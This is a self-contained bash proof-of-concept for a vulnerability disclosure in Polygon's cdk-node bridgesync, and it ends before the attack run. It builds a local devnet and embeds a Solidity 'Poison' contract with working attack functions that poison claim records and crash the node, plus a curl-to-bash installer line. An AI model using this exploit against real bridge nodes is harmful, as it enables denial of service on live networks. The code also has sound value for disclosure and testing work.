#!/usr/bin/env bash
# ============================================================================
#  poc.sh v4 — FULLY SELF-CONTAINED ONE-SHOT PoC
#  Claim-Calldata Trace Poisoning in cdk-node (0xPolygon/cdk)
#
#  ONE COMMAND. No kurtosis. No legacy bundle. No manual steps.
#  This script creates: devnet (2x geth), contracts (forge), agglayer,
#  cdk-node, the attack, and all evidence.
#
#  Usage:  ./poc.sh            (quick: watch 2 min)
#          ./poc.sh 20 --crash (final run for the report)
# ============================================================================
set -o pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CDK_DIR="${CDK_DIR:-$(dirname "$POC_DIR")}"
EV="$POC_DIR/evidence"; mkdir -p "$EV" "$POC_DIR/src" "$POC_DIR/.keys"

L1_RPC="http://localhost:8545"; L2_RPC="http://localhost:8547"
NODE="cdk-node"; DB_PATH="/app/data/bridgesync-l2.db"; CERTS="/app/data/certs"
GETH_IMG="ethereum/client-go:stable"

DEPLOYER="0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"     # funded by our genesis
PK_ATK="0xac0974bec39a17e36ba4a6ff4d22b03c699b947e62f77d99e7361e6315bd32d8"
AMOUNT=1000000000000000
CLAIM_TOPIC="0x1df3f2a973a00d6635911755c260704e95e8a5876997546798770f76396fda4d"
ERR_SUB="error getting info by global exit root"
JUNK_MER="0x$(printf '%056d' 0)deadbe01"; JUNK_RER="0x$(printf '%056d' 0)deadbe02"

WATCH_MIN=2; RUN_CRASH=0
for a in "$@"; do case "$a" in [0-9]*) WATCH_MIN="$a";; --crash) RUN_CRASH=1;; esac; done

log(){ printf '\n\033[1;36m== %s ==\033[0m\n' "$*"; }
die(){ printf '\033[1;31mFATAL: %s\033[0m\n(evidence: %s)\n' "$*" "$EV" >&2; exit 1; }
RESULTS=()
record(){ RESULTS+=("$1|$2"); printf '  [%s] %s\n' "$1" "$2"; }
check(){ local n="$1"; shift; if "$@"; then record PASS "$n"; else record FAIL "$n"; fi; }
poll_check(){ local n="$1" t="$2"; shift 2; local end=$((SECONDS+t))
  while (( SECONDS < end )); do if "$@"; then record PASS "$n"; return 0; fi; sleep 5; done
  record FAIL "$n"; return 1; }
kk(){ cast keccak "0x${1#0x}"; }
kk2(){ cast keccak "0x${1#0x}${2#0x}"; }

# node/log/db helpers --------------------------------------------------------
node_up(){ docker ps --filter "name=$NODE" --format '{{.Status}}' | grep -q '^Up'; }
err_count(){ local n; n=$(grep -c "$ERR_SUB" "$EV/node.log" 2>/dev/null); printf '%s' "${n:-0}"; }
err_at_least(){ [ "$(err_count)" -ge "$1" ]; }; err_gt(){ [ "$(err_count)" -gt "$1" ]; }
grep_log(){ grep -q "$1" "$EV/node.log"; }
grep_numclaims(){ grep -q "numClaims: $1" "$EV/node.log"; }
cert_count(){ local n; n=$(docker exec "$NODE" sh -c "ls $CERTS 2>/dev/null | grep -c certificate_"); printf '%s' "${n:-0}"; }
db_query(){ local db="$EV/tmp.db" i
  for i in 1 2 3; do
    rm -f "$EV/tmp.db"*; docker cp "$NODE:$DB_PATH" "$db" >/dev/null 2>&1 || { sleep 3; continue; }
    docker cp "$NODE:$DB_PATH-wal" "$db-wal" >/dev/null 2>&1 || true
    local r; r=$(sqlite3 "$db" "$1" 2>/dev/null) && { printf '%s' "$r"; return 0; }; sleep 3
  done; return 1; }
db_dump(){ local db="$EV/$1_bridgesync.db"; rm -f "$EV/$1_bridgesync.db"*
  for s in "" "-wal" "-shm"; do docker cp "$NODE:$DB_PATH$s" "$db$s" >/dev/null 2>&1 || true; done
  sqlite3 "$db" "SELECT block_num,global_index,mainnet_exit_root,rollup_exit_root,global_exit_root FROM claim ORDER BY block_num;" > "$EV/claims_$1.csv" 2>/dev/null || true; }
GER_CLEAN(){ printf '%s' "${1#0x}" | tr 'A-F' 'a-f'; }
db_row_ger(){ local row; row=$(db_query "SELECT CASE typeof(global_exit_root) WHEN 'blob' THEN hex(global_exit_root) ELSE lower(global_exit_root) END FROM claim WHERE global_index='$1';") || return 1
  [ -n "$row" ] && printf '%s' "$row" | tr -d 'x' | tr 'A-F' 'a-f' | grep -q "$(GER_CLEAN "$2")"; }
db_row_junk(){ local row; row=$(db_query "SELECT CASE typeof(mainnet_exit_root) WHEN 'blob' THEN hex(mainnet_exit_root) ELSE lower(mainnet_exit_root) END FROM claim WHERE global_index='$1';") || return 1
  printf '%s' "$row" | grep -qi deadbe01; }

# ============================================================================
log "ENV — dependencies"
command -v docker >/dev/null || die "docker missing"
sudo -n true 2>/dev/null || die "passwordless sudo required"
for pkg in jq sqlite3; do command -v "$pkg" >/dev/null || sudo apt-get install -y -qq "$pkg" >/dev/null 2>&1 || die "cannot install $pkg"; done
command -v cast >/dev/null 2>&1 || {
  curl -L https://foundry.paradigm.xyz | bash >/dev/null
  export PATH="$HOME/.foundry/bin:$PATH"; foundryup >/dev/null
  command -v cast >/dev/null || die "cast missing — reopen shell, rerun"; }
command -v forge >/dev/null 2>&1 || export PATH="$HOME/.foundry/bin:$PATH"
grep -q 'input\[:4\]' "$CDK_DIR/bridgesync/downloader.go" 2>/dev/null \
  || die "vulnerable code not in this checkout"

# --- Go binary ---------------------------------------------------------------
if [ ! -f "$CDK_DIR/target/cdk-node" ]; then
  log "ENV — building cdk-node (Go, one time)"
  MAIN=""; for d in cmd cmd/cdk cmd/cdk-node; do [ -f "$CDK_DIR/$d/main.go" ] && MAIN="./$d" && break; done
  [ -z "$MAIN" ] && [ -f "$CDK_DIR/main.go" ] && MAIN="."
  [ -n "$MAIN" ] || die "Go main not found: ls $CDK_DIR"
  GOVER="$(awk '/^go[ \t]/{print $2; exit}' "$CDK_DIR/go.mod" 2>/dev/null)"
  GOIMG="golang:1.24"; [ -n "$GOVER" ] && GOIMG="golang:$GOVER"
  docker run --rm -v "$CDK_DIR":/src -v cdk-gomodcache:/go/pkg/mod -v cdk-gobuildcache:/root/.cache/go-build \
    -w /src -e GOTOOLCHAIN=auto "$GOIMG" \
    sh -c "mkdir -p target && go build -buildvcs=false -o target/cdk-node $MAIN" 2>&1 | tee "$EV/gobuild.log" \
    || { tail -40 "$EV/gobuild.log"; die "go build failed"; }
fi
if ! docker image inspect cdk-poc >/dev/null 2>&1; then
  BCTX="$POC_DIR/.buildctx"; rm -rf "$BCTX"; mkdir -p "$BCTX/target"
  cp "$CDK_DIR/target/cdk-node" "$BCTX/target/"
  printf 'FROM debian:bookworm-slim\nRUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*\nCOPY target/cdk-node /usr/local/bin/cdk-node\n' > "$POC_DIR/Dockerfile.poc"
  docker build -q -t cdk-poc -f "$POC_DIR/Dockerfile.poc" "$BCTX" >/dev/null || die "cdk-poc build failed"
fi

# ============================================================================
log "CONTRACTS — forge project + dependency pinning"
git -C "$POC_DIR" init -q 2>/dev/null || true
cat > "$POC_DIR/foundry.toml" <<'TOML'
[profile.default]
src = "src"
out = "out"
solc = "0.8.20"
evm_version = "paris"
via_ir = true
optimizer = true
optimizer_runs = 200
TOML
cat > "$POC_DIR/remappings.txt" <<'RM'
@openzeppelin/contracts/=lib/openzeppelin-contracts/
@openzeppelin/contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/
RM

cat > "$POC_DIR/src/Poison.sol" <<'SOL'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IBridge {
    function claimAsset(
        bytes32[32] calldata smtProofLocalExitRoot,
        bytes32[32] calldata smtProofRollupExitRoot,
        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originTokenAddress,
        uint32 destinationNetwork, address destinationAddress,
        uint256 amount, bytes calldata metadata) external;
}
contract Poison {
    IBridge public immutable bridge;
    // Junk MER/RER => poisoned GER never exists in the L1 info tree
    // => aggsender certificate build fails forever.
    bytes32 private constant JUNK_MER = bytes32(uint256(0xdeadbe01));
    bytes32 private constant JUNK_RER = bytes32(uint256(0xdeadbe02));
    constructor(IBridge _bridge) { bridge = _bridge; }
    function _split(bytes calldata b) internal pure returns (bytes32[32] memory r) {
        require(b.length == 1024, "blob must be 1024 bytes");
        for (uint256 i = 0; i < 32; ++i) r[i] = bytes32(b[i * 32:(i + 1) * 32]);
    }
    /// CONTROL: a plain, fully valid claim routed through this contract.
    function claimOnly(
        bytes calldata proofBlob, uint256 globalIndex,
        bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress, amount, metadata);
    }
    /// ATTACK (Variant B): valid claim FIRST (only ClaimEvent), poisoned call
    /// LAST. bridgesync LIFO pops the poisoned frame first, matches
    /// globalIndex, overwrites the claim, and returns.
    function attackWorstCase(
        bytes calldata proofBlob, uint256 globalIndex,
        bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bytes32[32] memory zero;
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress, amount, metadata);
        (bool ok, ) = address(bridge).call(abi.encodeCall(
            IBridge.claimAsset,
            (zero, zero, globalIndex, JUNK_MER, JUNK_RER, originNetwork, originToken,
             destinationNetwork, destinationAddress, amount, metadata)));
        ok; // revert is expected; calldata is what poisons bridgesync
    }
    /// ATTACK (Variant A): 2-byte input => input[:4] panic in bridgesync.
    function attackCrash(
        bytes calldata proofBlob, uint256 globalIndex,
        bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress, amount, metadata);
        (bool ok, ) = address(bridge).call(hex"1234");
        ok;
    }
}
SOL

# our own minimal L2 GER manager: oracle inserts GERs, map checked by claims
cat > "$POC_DIR/src/GERL2.sol" <<'SOL'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
/// Minimal PolygonZkEVMGlobalExitRootL2 equivalent for the devnet:
/// AggOracle inserts GERs (keccak(MER,RER) read from L1) so that
/// bridge.claimAsset GER checks pass; bridge may notify exit-root updates.
contract GERL2 {
    mapping(bytes32 => uint256) public globalExitRootMap;
    address public immutable bridgeAddress;
    constructor(address _bridgeAddress) { bridgeAddress = _bridgeAddress; }
    function insertGlobalExitRoot(bytes32 ger) external { globalExitRootMap[ger] = block.timestamp; }
    function updateExitRoot(bytes32 newRoot) external { globalExitRootMap[newRoot] = block.timestamp; }
}
SOL

cd "$POC_DIR"
forge install --no-commit OpenZeppelin/openzeppelin-contracts@v5.0.2 >/dev/null 2>&1 \
  || forge install --no-commit OpenZeppelin/openzeppelin-contracts >/dev/null 2>&1 || die "OZ install failed"
forge install --no-commit OpenZeppelin/openzeppelin-contracts-upgradeable@v5.0.2 >/dev/null 2>&1 \
  || forge install --no-commit OpenZeppelin/openzeppelin-contracts-upgradeable >/dev/null 2>&1 || die "OZ-upg install failed"
forge install --no-commit 0xPolygon/cdk-contracts-tooling >/dev/null 2>&1 \
  || die "cdk-contracts-tooling install failed (network?)"

# vendor the whole contracts tree (relative imports stay intact)
mkdir -p src/vendor
cp -r lib/cdk-contracts-tooling/contracts/. src/vendor/ 2>/dev/null || die "cannot copy contracts tree"
log "CONTRACTS — forge build (first time: ~1-2 min)"
forge build 2>&1 | tail -5 > "$EV/forgebuild.log" || { cat "$EV/forgebuild.log"; die "forge build failed"; }
INIT=$(jq -r 'if (.bytecode|type)=="object" then .bytecode.object else .bytecode end' out/Poison.sol/Poison.json 2>/dev/null)
[ -n "$INIT" ] && [ "$INIT" != "null" ] || die "Poison bytecode missing"

# --- auto-deploy via runtime ABI introspection -------------------------------
# resolves a constructor argument NAME to a value using deploy context
resolve_arg(){ # name ctx_ger ctx_bridge ctx_rm
  local n="$(printf '%s' "$1" | tr 'A-Z' 'a-z')"
  case "$n" in
    *globalexitroot*|*ger*)            echo "$2";;
    *bridge*)                          echo "$3";;
    *rollupmanager*)                   echo "$4";;
    *forkid*|*fork*)                   echo 12;;
    *consensus*)                       echo "0x0000000000000000000000000000000000000000";;
    *owner*|*admin*|*operator*|*deployer*|*sender*) echo "$DEPLOYER";;
    *salt*)                            echo "0x$(printf '%064d' 0)";;
    *genesis*|*block*|*network*|*chain*) echo 0;;
    *) echo "UNKNOWN";;
  esac
}
precompute_addr(){ # deployer nonce -> address (CREATE)
  python3 - "$1" "$2" <<'PY'
import sys, subprocess
d, n = sys.argv[1].lower().replace('0x',''), int(sys.argv[2])
rlp = 'd6' + '94' + d + ('%02x' % n) if n < 0x80 else 'd7' + '94' + d + '81' + ('%02x' % n)
h = subprocess.run(['cast','keccak','0x'+rlp], capture_output=True, text=True).stdout.strip()
print('0x' + h[-40:])
PY
}
deploy_contract(){ # name rpc ger bridge rm -> echoes deployed address
  local name="$1" rpc="$2" ger="$3" br="$4" rm="$5"
  local bc abi types names vals enc raw addr
  bc=$(forge inspect "$name" bytecode 2>/dev/null) || { echo "FAIL_NOINSPECT"; return 1; }
  abi=$(forge inspect --json "$name" abi 2>/dev/null)
  types=$(printf '%s' "$abi" | jq -r 'map(select(.type=="constructor"))[0].inputs | map(.type) | join(",")' 2>/dev/null)
  names=$(printf '%s' "$abi" | jq -r 'map(select(.type=="constructor"))[0].inputs | map(.name) | join(",")' 2>/dev/null)
  vals=(); local i=0 tn
  if [ -n "$types" ] && [ "$types" != "" ] && [ "$(printf '%s' "$abi" | jq -r 'map(select(.type=="constructor"))[0].inputs|length')" != "0" ]; then
    IFS=',' read -ra TN <<< "$types"; local NN=(); IFS=',' read -ra NN <<< "$names"
    for i in "${!TN[@]}"; do
      local v; v=$(resolve_arg "${NN[$i]:-}" "$ger" "$br" "$rm")
      if [ "$v" = "UNKNOWN" ]; then
        printf 'CONSTRUCTOR ARG UNMAPPED: contract=%s arg=%s type=%s\nFULL CTOR: %s\n' \
          "$name" "${NN[$i]}" "${TN[$i]}" "$(printf '%s' "$abi" | jq -c 'map(select(.type=="constructor"))')" >&2
        return 1
      fi
      vals+=("$v")
    done
    enc=$(cast abi-encode "constructor($types)" "${vals[@]}" 2>/dev/null) || return 1
  else enc="0x"; fi
  raw=$(cast send --create "$bc${enc#0x}" --rpc-url "$rpc" --private-key "$PK_ATK" --json 2>"$EV/deploy_$name.err") || { echo "FAIL_DEPLOY"; return 1; }
  addr=$(printf '%s' "$raw" | jq -r '.contractAddress // empty')
  [ -n "$addr" ] || { echo "FAIL_NOADDR"; return 1; }
  printf '%s' "$raw" > "$EV/receipt_deploy_$name.json"
  echo "$addr"
}

# ============================================================================
log "NET — genesis + geth containers (l1, l2)"
python3 - "$EV" "$DEPLOYER" <<'PY'
import json, sys, pathlib
ev, dep = sys.argv[1], sys.argv[2]
def genesis(chainid, dep):
    extradata = "0x" + "00"*32 + dep[2:].lower() + "00"*65
    return {
        "config": {"chainId": chainid, "homesteadBlock": 0, "eip150Block": 0,
                   "eip155Block": 0, "eip158Block": 0, "byzantiumBlock": 0,
                   "constantinopleBlock": 0, "petersburgBlock": 0, "istanbulBlock": 0,
                   "berlinBlock": 0, "londonBlock": 0, "shanghaiTime": 0,
                   "clique": {"period": 1, "epoch": 30000}},
        "difficulty": "0x1", "gasLimit": "0x1c9c380", "extradata": extradata,
        "alloc": {dep: {"balance": "0x21e19e0c9bab2400000"},
                  "0x70997970C51812dc3A010C7d01b50e0d17dc79C8": {"balance": "0x152d02c7e14af6800000"}},
    }
pathlib.Path(ev + "/gen-l1.json").write_text(json.dumps(genesis(1337, dep)))
pathlib.Path(ev + "/gen-l2.json").write_text(json.dumps(genesis(2741, dep)))
print("genesis written: 1337 + 2741, clique period 1")
PY
printf 'testonly' > "$POC_DIR/.keys/pwd.txt"
printf '%s' "$PK_ATK" > "$POC_DIR/.keys/pk.txt"

docker network inspect cdk >/dev/null 2>&1 || docker network create cdk >/dev/null
for c in l1 l2 agglayer "$NODE"; do docker rm -f "$c" >/dev/null 2>&1 || true; done
for v in poc-l1-data poc-l2-data agglayer-data cdk-node-data; do docker volume rm "$v" >/dev/null 2>&1 || true; done

start_geth(){ # name datadir_vol genesis rpcport wsport networkid
  docker run --rm -v "$2":/d -v "$EV/$3":/g:ro "$GETH_IMG" \
    account import --datadir /d --password "$POC_DIR/.keys/pwd.txt" "$POC_DIR/.keys/pk.txt" >/dev/null 2>&1 \
    || die "$1: account import failed"
  docker run --rm -v "$2":/d -v "$EV/$3":/g:ro "$GETH_IMG" \
    --datadir /d init /g >/dev/null 2>&1 || die "$1: init failed"
  docker run -d --name "$1" --network cdk -p "$4":8545 -p "$5":8546 \
    -v "$2":/d -v "$POC_DIR/.keys":/k:ro "$GETH_IMG" \
    --datadir /d --networkid "$6" --syncmode full --gcmode archive \
    --mine --miner.etherbase "$DEPLOYER" --unlock "$DEPLOYER" --password /k/pwd.txt --allow-insecure-unlock \
    --http --http.addr 0.0.0.0 --http.port 8545 --http.api eth,net,web3,debug,txpool --http.vhost '*' \
    --ws --ws.addr 0.0.0.0 --ws.port 8546 --ws.api eth,net,web3 \
    --nodiscover --verbosity 3 >/dev/null || die "$1: run failed"
}
start_geth l1 poc-l1-data gen-l1.json 8545 8546 1337
start_geth l2 poc-l2-data gen-l2.json 8547 8548 2741

log "NET — waiting for L1/L2 RPC"
for i in $(seq 1 60); do
  cast block-number --rpc-url "$L1_RPC" >/dev/null 2>&1 && cast block-number --rpc-url "$L2_RPC" >/dev/null 2>&1 && break
  sleep 5
done
cast block-number --rpc-url "$L1_RPC" >/dev/null 2>&1 || die "L1 RPC not up"
cast block-number --rpc-url "$L2_RPC" >/dev/null 2>&1 || die "L2 RPC not up"

# ============================================================================
log "DEPLOY — contracts (runtime ABI introspection, auto-wiring)"
# L1: GER V2 (+ precomputed bridge/RM for constructor wiring), RM best-effort, Bridge
N0=$(cast nonce "$DEPLOYER" --rpc-url "$L1_RPC")
PRE_BRIDGE_L1=$(precompute_addr "$DEPLOYER" $((N0+2)))
PRE_RM_L1=$(precompute_addr "$DEPLOYER" $((N0+1)))
GER_L1=$(deploy_contract PolygonZkEVMGlobalExitRootV2 "$L1_RPC" "" "$PRE_BRIDGE_L1" "$PRE_RM_L1")
[ "${GER_L1:0:4}" = "0x9" ] || [ "${#GER_L1}" -eq 42 ] || die "GER_L1 deploy failed: $GER_L1"
RM_L1=$(deploy_contract PolygonRollupManager "$L1_RPC" "$GER_L1" "$PRE_BRIDGE_L1" "" 2>>"$EV/deploy_rm.err") || true
[ -n "$RM_L1" ] && [ "${#RM_L1}" -eq 42 ] || { echo "  RollupManager best-effort failed — using GER addr as placeholder"; RM_L1="$GER_L1"; }
BRIDGE_L1=$(deploy_contract PolygonZkEVMBridgeV2 "$L1_RPC" "$GER_L1" "" "$RM_L1")
[ "${#BRIDGE_L1}" -eq 42 ] || die "BRIDGE_L1 deploy failed: $BRIDGE_L1 (see $EV/receipt_deploy_* / deploy_*.err)"

# L2: GERL2 with precomputed bridge, then Bridge (auto-lands on precomputed addr)
N2=$(cast nonce "$DEPLOYER" --rpc-url "$L2_RPC")
PRE_BRIDGE_L2=$(precompute_addr "$DEPLOYER" $((N2+1)))
GER_L2=$(deploy_contract GERL2 "$L2_RPC" "" "$PRE_BRIDGE_L2" "")
[ "${#GER_L2}" -eq 42 ] || die "GER_L2 deploy failed: $GER_L2"
BRIDGE_L2=$(deploy_contract PolygonZkEVMBridgeV2 "$L2_RPC" "$GER_L2" "" "")
[ "${#BRIDGE_L2}" -eq 42 ] || die "BRIDGE_L2 deploy failed: $BRIDGE_L2"
echo "  L1: GER=$GER_L1 RM=$RM_L1 BRIDGE=$BRIDGE_L1"
echo "  L2: GER=$GER_L2 BRIDGE=$BRIDGE_L2"
cat > "$EV/deployments.env" <<ENV
GER_L1=$GER_L1
RM_L1=$RM_L1
BRIDGE_L1=$BRIDGE_L1
GER_L2=$GER_L2
BRIDGE_L2=$BRIDGE_L2
ENV

# ============================================================================
log "NET — agglayer"
# keystores for aggsender / aggoracle / agglayer (same devnet key, password testonly)
FH="$POC_DIR/.fhome"; rm -rf "$FH"; mkdir -p "$FH"
HOME="$FH" cast wallet import aggsender  --private-key "$PK_ATK" --unsafe-password testonly >/dev/null 2>&1 || true
HOME="$FH" cast wallet import aggoracle --private-key "$PK_ATK" --unsafe-password testonly >/dev/null 2>&1 || true
HOME="$FH" cast wallet import agglayer  --private-key "$PK_ATK" --unsafe-password testonly >/dev/null 2>&1 || true
KS=(); while IFS= read -r f; do KS+=("$f"); done < <(find "$FH" -name 'UTC*' 2>/dev/null | sort)
mkdir -p "$POC_DIR/.keystores"
[ -n "${KS[0]:-}" ] && cp "${KS[0]}" "$POC_DIR/.keystores/aggsender.keystore"
[ -n "${KS[1]:-}" ] && cp "${KS[1]}" "$POC_DIR/.keystores/aggoracle.keystore"
[ -n "${KS[2]:-}" ] && cp "${KS[2]}" "$POC_DIR/.keystores/agglayer.keystore"
[ -f "$POC_DIR/.keystores/aggsender.keystore" ] || die "keystore generation failed"

AGG_IMG=""
for img in ghcr.io/0xpolygon/agglayer:latest hermeznetwork/agglayer:latest; do
  if docker pull -q "$img" >/dev/null 2>&1; then AGG_IMG="$img"; break; fi
done
if [ -z "$AGG_IMG" ]; then
  log "NET — agglayer image unavailable: building from source (~10 min, one time)"
  git clone --depth 1 https://github.com/0xPolygon/agglayer /tmp/agglayer-src >/dev/null 2>&1 || die "agglayer clone failed"
  docker run --rm -v /tmp/agglayer-src:/src -v agglayer-cargo:/usr/local/cargo/registry -w /src rust:1.79 \
    sh -c "cargo build --release 2>&1 | tail -3" | tee "$EV/aggbuild.log" || die "agglayer cargo build failed"
  mkdir -p /tmp/agglayer-img
  cp /tmp/agglayer-src/target/release/agglayer /tmp/agglayer-img/ 2>/dev/null || die "agglayer binary not found (check name)"
  printf 'FROM debian:bookworm-slim\nRUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*\nCOPY agglayer /usr/local/bin/agglayer\n' > /tmp/agglayer-img/Dockerfile
  docker build -q -t agglayer:local /tmp/agglayer-img >/dev/null || die "agglayer image build failed"
  AGG_IMG="agglayer:local"
fi
# agglayer config from template, patched with deployed L1 addresses
cat > "$POC_DIR/agglayer-config.toml" <<'AGG'
[log]
level = "info"
[rpc]
grpc-port = 9089
readrpc-port = 9090
admin-port = 9091
host = "0.0.0.0"
[rate-limiting]
send-tx = "unlimited"
[l1]
chain-id = 1337
node-url = "http://l1:8545/"
ws-node-url = "ws://l1:8546/"
rollup-manager-contract = "__RM_L1__"
polygon-zkevm-global-exit-root-v2-contract = "__GER_L1__"
[auth.local]
private-keys = [{ path = "/keystore/agglayer.keystore", password = "testonly" }]
[epoch.block-clock]
epoch-duration = 6
genesis-block = 0
[storage]
db-path = "/data/agglayer"
AGG
sed -i "s|__RM_L1__|$RM_L1|; s|__GER_L1__|$GER_L1|" "$POC_DIR/agglayer-config.toml"
docker run -d --name agglayer --network cdk -p 9090:9090 \
  -v agglayer-data:/data -v "$POC_DIR/agglayer-config.toml":/app/config.toml:ro \
  -v "$POC_DIR/.keystores/agglayer.keystore":/keystore/agglayer.keystore:ro \
  "$AGG_IMG" --config /app/config.toml >/dev/null 2>&1 \
  || docker run -d --name agglayer --network cdk -p 9090:9090 \
       -v agglayer-data:/data -v "$POC_DIR/agglayer-config.toml":/app/config.toml:ro \
       -v "$POC_DIR/.keystores/agglayer.keystore":/keystore/agglayer.keystore:ro \
       "$AGG_IMG" >/dev/null 2>&1 \
  || die "agglayer failed to start — paste: docker logs agglayer"
sleep 10
docker ps --format '{{.Names}}' | grep -q agglayer || { docker logs agglayer 2>&1 | tail -20; die "agglayer exited"; }

# ============================================================================
log "NET — cdk-node (aggsender + bridgesync SyncFullClaims=true)"
cat > "$POC_DIR/poc.config.toml" <<'CFG'
[Common]
IsValidiumMode = false
ContractVersions = "banana"
[L1Config]
chainId = 1337
polTokenAddress = "0x0000000000000000000000000000000000000000"
polygonZkEVMAddress = "__BRIDGE_L1__"
polygonRollupManagerAddress = "__RM_L1__"
polygonZkEVMGlobalExitRootAddress = "__GER_L1__"
[AggSender]
StoragePath = "/app/data/aggsender.db"
AggLayerURL = "http://agglayer:9090"
AggsenderPrivateKey = {Path = "/app/keystore/aggsender.keystore", Password = "testonly"}
URLRPCL2 = "http://l2:8545"
BlockFinality = "LatestBlock"
EpochNotificationPercentage = 0
SaveCertificatesToFilesPath = "/app/data/certs"
MaxRetriesStoreCertificate = 5
DelayBeetweenRetries = "5s"
KeepCertificatesHistory = false
MaxCertSize = 0
BridgeMetadataAsHash = false
DryRun = false
EnableRPC = true
[BridgeL2Sync]
DBPath = "/app/data/bridgesync-l2.db"
BlockFinality = "LatestBlock"
InitialBlockNum = 0
BridgeAddr = "__BRIDGE_L2__"
SyncBlockChunkSize = 100
RetryAfterErrorPeriod = "5s"
MaxRetryAttemptsAfterError = 5
WaitForNewBlocksPeriod = "1s"
OriginNetwork = 0
SyncFullClaims = true
[BridgeL1Sync]
DBPath = "/app/data/bridgesync-l1.db"
BlockFinality = "LatestBlock"
InitialBlockNum = 0
BridgeAddr = "__BRIDGE_L1__"
SyncBlockChunkSize = 100
RetryAfterErrorPeriod = "5s"
MaxRetryAttemptsAfterError = 5
WaitForNewBlocksPeriod = "1s"
OriginNetwork = 1
SyncFullClaims = false
[L1InfoTreeSync]
DBPath = "/app/data/l1infotreesync.db"
GlobalExitRootAddr = "__GER_L1__"
RollupManagerAddr = "__RM_L1__"
SyncBlockChunkSize = 100
BlockFinality = "LatestBlock"
URLRPCL1 = "http://l1:8545"
WaitForNewBlocksPeriod = "1s"
InitialBlock = 0
RetryAfterErrorPeriod = "5s"
MaxRetryAttemptsAfterError = 5
[ReorgDetectorL1]
DBPath = "/app/data/reorgdetector-l1.db"
URLRPCL1 = "http://l1:8545"
BlockFinality = "LatestBlock"
WaitPeriodBlocks = "1s"
[ReorgDetectorL2]
DBPath = "/app/data/reorgdetector-l2.db"
URLRPCL2 = "http://l2:8545"
BlockFinality = "LatestBlock"
WaitPeriodBlocks = "1s"
[Log]
Environment = "development"
Level = "info"
Outputs = ["stderr"]
[AggOracle]
BlockFinality = "LatestBlock"
TargetChainType = "EVM"
WaitPeriodNextGER = "10s"
[AggOracle.EVMSender]
GlobalExitRootL2Addr = "__GER_L2__"
SenderAddr = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
GasOffset = 0
WaitPeriodMonitorTx = "5s"
[AggOracle.EVMSender.EthTxManager]
FrequencyToMonitorTxs = "1s"
WaitTxToBeMined = "2m"
GetReceiptMaxTime = "250ms"
GetReceiptWaitInterval = "1s"
PrivateKeys = [{Path = "/app/keystore/aggoracle.keystore", Password = "testonly"}]
ForcedGas = 0
GasPriceMarginFactor = 1
MaxGasPriceLimit = 0
StoragePath = "/app/data/ethtxmanager.db"
ReadPendingL1Txs = false
SafeStatusL1NumberOfBlocks = 0
FinalizedStatusL1NumberOfBlocks = 0
[AggOracle.EVMSender.EthTxManager.Etherman]
URL = "http://l2:8545"
MultiGasProvider = false
L1ChainID = 2741
HTTPHeaders = []
CFG
sed -i "s|__BRIDGE_L1__|$BRIDGE_L1|g; s|__RM_L1__|$RM_L1|g; s|__GER_L1__|$GER_L1|g; s|__BRIDGE_L2__|$BRIDGE_L2|g; s|__GER_L2__|$GER_L2|g" "$POC_DIR/poc.config.toml"

docker run -d --name "$NODE" --network cdk --restart unless-stopped \
  -v "$POC_DIR/poc.config.toml":/app/config.toml:ro \
  -v "$POC_DIR/.keystores":/app/keystore:ro \
  -v cdk-node-data:/app/data \
  cdk-poc cdk-node run --cfg /app/config.toml >/dev/null 2>&1 \
  || die "cdk-node failed to start — docker logs $NODE"
sleep 15
node_up || { docker logs "$NODE" 2>&1 | tail -30; die "cdk-node exited (see log above)"; }

: > "$EV/node.log"
docker logs -f --timestamps "$NODE" >"$EV/node.log" 2>&1 & LOGPID=$!
trap 'kill $LOGPID 2>/dev/null' EXIT

poll_check "aggsender alive (certificate loop / idle visible)" 600 \
  sh -c "grep -qE 'building certificate|no bridges consumed|AggSender started' '$EV/node.log'" \
  || { docker logs "$NODE" 2>&1 | tail -40; die "aggsender not active"; }

{ echo "commit: $(git -C "$CDK_DIR" rev-parse HEAD)"; cast --version; date -u; } > "$EV/environment.txt"

# ============================================================================
#  P0–P7 (unchanged design; addresses are now dynamic)
BRIDGE_TOPIC=$(cast sig-event "BridgeEvent(uint8,uint32,address,uint32,address,uint256,bytes,uint32)")
init_ladders(){ local z0="0x$(printf '%064d' 0)"; Z_LAD=("$z0")
  for i in $(seq 1 31); do Z_LAD[i]=$(kk2 "${Z_LAD[$((i-1))]}" "${Z_LAD[$((i-1))]}"); done; }
init_ladders
root_single(){ local n="$1" i; for i in $(seq 0 31); do n=$(kk2 "$n" "${Z_LAD[$i]}"); done; printf '%s' "$n"; }
root_pair(){ local n; n=$(kk2 "$1" "$2"); local i; for i in $(seq 1 31); do n=$(kk2 "$n" "${Z_LAD[$i]}"); done; printf '%s' "$n"; }
root_triple(){ local n; n=$(kk2 "$(kk2 "$1" "$2")" "$(kk2 "$3" "${Z_LAD[0]}")"); local i; for i in $(seq 2 31); do n=$(kk2 "$n" "${Z_LAD[$i]}"); done; printf '%s' "$n"; }
